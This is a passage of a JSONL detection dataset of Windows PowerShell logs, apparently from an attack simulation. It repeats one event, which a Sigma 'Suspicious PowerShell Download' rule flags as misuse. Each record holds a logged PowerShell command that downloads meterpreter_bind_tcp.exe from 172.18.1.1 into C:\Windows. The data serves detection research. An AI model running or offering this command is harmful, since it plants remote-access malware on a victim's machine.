"Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")"}, "sequence": 1, "total": 1}, "winlog": {"activity_id": "{1ff30d06-1386-0001-2161-f41f8613d901}", "api": "wineventlog", "channel": "Microsoft-Windows-PowerShell/Operational", "computer_name": "CLIENT1.breach.local", "event_id": 4104, "opcode": "On create calls", "process": {"pid": 3036, "thread": {"id": 4460}}, "provider_guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "provider_name": "Microsoft-Windows-PowerShell", "record_id": 6203, "task": "Execute a Remote Command", "user": {"domain": "CLIENT1", "identifier": "S-1-5-21-1007433295-766092996-2957732838-1003", "name": "ssh", "type": "User"}, "version": 1}}, "rule": {"name": "Suspicious PowerShell Download", "authors": ["Florian Roth"], "level": "critical", "source": "sigma", "status": "experimental", "falsepositives": ["PowerShell scripts that download content from the Internet"], "id": "403c2cc0-7f6b-4925-9423-bfa573bed7eb", "logsource": {"category": "ps_script", "definition": "Script block logging must be enabled", "product": "windows"}, "tags": ["attack.execution", "attack.t1059.001"]}, "metadata": {"group": "Sigma", "kind": "individual", "document": {"kind": "jsonl", "path": "simulation_datasets/simulation_1/EntireSimulation_winlogbeat.jsonl"}, "timestamp": "2022-12-19T10:08:07.506+00:00", "misuse": true, "mitreattack": {"Command and Control": ["t1105"], "Execution": ["t1059.001"]}, "comment": "Ingress Tool Transfer / Powershell"}}
{"event": {"@timestamp": "2022-12-19T10:08:07.506Z", "agent": {"ephemeral_id": "75382475-4494-4885-af56-0a918c9c7d5b", "hostname": "CLIENT1", "id": "a5ea4d3e-40c5-43d5-9a2e-ed2c48327430", "name": "CLIENT1", "type": "winlogbeat", "version": "7.10.2"}, "ecs": {"version": "1.5.0"}, "event": {"action": "Execute a Remote Command", "category": ["process"], "code": 4104, "created": "2022-12-19T10:08:08.268Z", "kind": "event", "module": "powershell", "provider": "Microsoft-Windows-PowerShell", "type": ["info"]}, "host": {"name": "CLIENT1.breach.local"}, "log": {"level": "verbose"}, "message": "Creating Scriptblock text (1 of 1):\n$c = new-object System.Net.WebClient; $c.DownloadFile(\"http://172.18.1.1/meterpreter_bind_tcp.exe\", \"C:\\Windows\\meterpreter_bind_tcp.exe\")\n\nScriptBlock ID: dcc38361-840d-40e3-a6f6-f86a1c86eb51\nPath: ", "powershell": {"file": {"script_block_id": "dcc38361-840d-40e3-a6f6-f86a1c86eb51", "script_block_text": "$c = new-object 